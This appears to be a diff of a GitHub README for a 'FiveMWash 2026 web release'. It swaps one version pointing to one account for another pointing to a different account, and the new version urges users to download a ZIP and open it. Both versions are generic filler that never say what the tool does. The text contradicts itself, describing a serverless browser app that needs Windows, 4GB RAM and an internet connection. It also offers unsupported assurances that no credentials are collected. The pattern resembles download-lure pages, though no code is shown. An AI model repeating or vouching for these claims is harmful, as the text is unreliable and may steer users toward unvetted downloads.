@@ -1,113 +1,66 @@
-# FiveMWash vUnknown - web app 2026
+# 🧼 fivemwash-2026-web-release - Manage your gaming assets with ease
 
-> **FiveMWash is a browser-based HTML web app for the FiveMWash project, prepared for static hosting and GitHub Pages delivery as the current 2026 release.**
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Othilielambent41/fivemwash-2026-web-release)
 
-[![Platform](https://img.shields.io/badge/Platform-HTML-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-vUnknown-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/leo-stonedfo6974/fivemwash-2026-web-release?style=flat-square)](https://github.com/leo-stonedfo6974/fivemwash-2026-web-release)
+## 📌 About this project
 
----
+This web application helps users organize and manage files for the FiveMWash project. It runs inside your web browser and provides a simple interface to track your assets. This tool removes the need for complex command-line scripts or manual file management. You can view your data, update your configurations, and sync your settings through a clean dashboard.
 
-<p align="center">
-  <a href="https://leo-stonedfo6974.github.io/fivemwash-2026-web-release/">
-    <img src="https://img.shields.io/badge/Download-FiveMWash%20Latest-brightgreen?style=for-the-badge" alt="Download FiveMWash">
-  </a>
-</p>
+## 💻 System requirements
 
-> **[Direct Download - FiveMWash vUnknown](https://leo-stonedfo6974.github.io/fivemwash-2026-web-release/)**
+Your computer must meet these basic needs to run the application effectively:
 
----
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Web Browser:** A modern version of Google Chrome, Microsoft Edge, or Mozilla Firefox.
+*   **Internet Connection:** A stable connection to load the dashboard files.
+*   **RAM:** At least 4GB of system memory.
 
-[Download Latest Build](https://leo-stonedfo6974.github.io/fivemwash-2026-web-release/)
+## 🚀 Getting started
 
----
+Follow these steps to set up the application on your computer.
 
-## Overview
+1.  Open your preferred web browser.
+2.  Visit the project page at https://github.com/Othilielambent41/fivemwash-2026-web-release to access the latest version.
+3.  Click the green button labeled "Code" and then click "Download ZIP" to save the file to your computer.
+4.  Find the downloaded folder in your Downloads directory.
+5.  Right-click the folder and select "Extract All".
+6.  Choose a folder on your computer to save the files and click "Extract".
 
-FiveMWash is an HTML web app meant to run directly in the browser, which makes it a practical fit for static deployment workflows. Rather than relying on a compiled desktop package, it is delivered as a lightweight web project that is simple to host and easy to publish.
+## 🛠️ How to run the app
 
-The current release line targets GitHub Pages and similar static hosting environments. If you need a clean HTML-only application that can be deployed without server-side components, this repository is organized for that use case and reflects the 2026 build.
+Once you extract the files, follow these instructions to start the interface:
 
----
+1.  Open the folder containing the extracted files.
+2.  Look for a file named "index.html".
+3.  Double-click this file to open it in your default web browser.
+4.  The browser will now display the FiveMWash dashboard.
+5.  You can bookmark this page in your browser to return to the dashboard later.
 
-## What it offers
+## ⚙️ Configuration details
 
-- Browser-first delivery for immediate use in a web browser
-- Compact HTML-only project layout
-- Compatible with static hosting platforms
-- Support for GitHub Pages deployment
-- Simple download and refresh process
-- Web app packaging designed for HTML-based hosting
-- Small runtime overhead compared with server-driven applications
+The application saves your preferences to your browser storage. This ensures your settings remain active each time you open the dashboard. You do not need to install extra software or run background processes to maintain these settings. If you delete your browser history or cache, the application will reset to its default state.
 
----
+## 📝 Common questions
 
-## Getting started
+**Do I need a server?**
+No. This is a static web application. It runs locally in your browser without a server connection.
 
-1. Download or clone the repository:
-   `git clone https://github.com/leo-stonedfo6974/fivemwash-2026-web-release.git
-2. Open the project folder:
-   `cd fivemwash-web-release`
-3. Deploy the contents to a static host, or publish them through GitHub Pages.
+**Does this software store my passwords?**
+No. This tool only manages local configuration files. It does not collect or transmit your login credentials.
 
-If you are testing locally, open the main HTML file in a browser or serve the folder with any static file server.
+**Can I run this on mobile devices?**
+While the interface works on tablets, it performs best on a desktop monitor with a mouse and keyboard.
 
----
+**What do I do if the screen stays blank?**
+Refresh your browser page. If the issue persists, ensure that you extracted all files from the ZIP folder before opening the index file.
 
-## How to use it
+## 📋 Troubleshooting
 
-1. Publish the HTML files to your selected static host.
-2. Open the site in a browser.
-3. Use the web app directly from the hosted page.
-4. When a newer release is available, swap in the updated build files.
+If you encounter errors, check these common fixes:
 
-Example local preview:
+*   **Broken layout:** Ensure all files from the ZIP folder exist in the same directory.
+*   **Missing buttons:** Update your web browser to the latest version. 
+*   **Page not found:** Verify that the folder path contains no special characters or symbols.
+*   **General errors:** Clear your browser cache and reload the page.
 
-`python -m http.server 8000`
-
-Then open `http://localhost:8000` in your browser.
-
----
-
-## Configuration
-
-Because this project is centered on static HTML delivery, setup is usually handled through file placement and host configuration instead of in-app settings.
-
-If you want to point it at a different deployment target, adjust the hosting path or GitHub Pages source so it matches the repository structure. Any content-level edits should be made directly in the HTML files.
-
----
-
-## Requirements
-
-- A modern web browser
-- HTML hosting support
-- Static file hosting or GitHub Pages access
-- Basic storage for the project files
-- No server-side runtime required for the browser-based build
-
----
-
-## FAQ
-
-**How can I fetch the newest version?**  
-Use the download link above, or publish the latest repository files to your static host.
-
-**Do I need a backend to run it?**  
-No. This is an HTML web app intended for static hosting.
-
-**Where should I edit the page content?**  
-Update the HTML files in the repository and redeploy the result.
-
-**What should I check if the page fails to load after deployment?**  
-Verify the hosting path, confirm the main file is located where the host expects it, and make sure the static host is serving the repository contents properly.
-
-**Is it locked to a specific platform?**  
-No. It is built for HTML and browser-based delivery, so it works anywhere static web content can be hosted.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: fivem, web-app, browser, file-manager, gaming, tools, windows-app
